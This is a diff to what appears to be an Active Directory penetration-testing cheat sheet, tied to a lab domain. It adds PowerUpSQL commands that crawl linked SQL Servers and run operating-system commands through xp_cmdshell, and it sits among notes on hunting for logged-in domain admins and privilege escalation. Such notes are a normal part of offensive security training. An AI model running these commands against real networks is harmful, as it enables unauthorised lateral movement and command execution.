@@ -117,6 +117,12 @@ Invoke-UserHunter -Stealth (Find computers where a domain admin is logged-in)
 With PowerUpSQL:
 Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose (find accessible sql server with current user)
 
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose (Enum server sql to check admin right)
+
+If xp_cmdshell is enabled (or RPC out is true), command execution is possible via this command:
+
+Get-SQLServerLinkCrawl -Instance <FQDN-SQL-Server> -Query "exec master..xp_cmdshell 'whoami'"
+
 # Priv Esc
 
 PowerUp: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
